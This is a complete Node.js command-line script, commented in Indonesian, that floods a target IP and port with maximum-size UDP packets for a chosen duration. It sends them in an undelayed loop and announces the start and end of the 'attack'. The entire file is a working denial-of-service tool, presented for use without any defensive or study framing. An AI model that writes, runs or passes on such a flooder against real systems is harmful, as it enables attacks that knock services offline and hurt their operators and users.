const dgram = require("dgram");

// Ambil argumen dari CLI
const target_ip = process.argv[2]; // IP Target
const target_port = parseInt(process.argv[3]); // Port Target
const duration = parseInt(process.argv[4]); // Durasi Serangan (detik)

if (!target_ip || !target_port || !duration) {
    console.log("Usage: node udp_flood.js <IP> <Port> <Duration>");
    process.exit(1);
}

const packet_size = 65507; // MAX UKURAN UDP (65507 Bytes)
const socket = dgram.createSocket("udp4");
const packet = Buffer.alloc(packet_size, "X"); // Isi Paket Acak

console.log(`🔥 Starting UDP Flood → Target: ${target_ip}:${target_port} | Packet Size: ${packet_size} Bytes | Duration: ${duration}s 🔥`);

const startTime = Date.now();
const endTime = startTime + duration * 1000;

function sendPacket() {
    if (Date.now() > endTime) {
        console.log("✅ Attack Finished!");
        process.exit(0);
    }

    socket.send(packet, 0, packet.length, target_port, target_ip, (err) => {
        if (err) console.error("Send Error:", err);
    });

    setImmediate(sendPacket); // Loop Tanpa Delay
}

// Mulai Serangan
sendPacket();
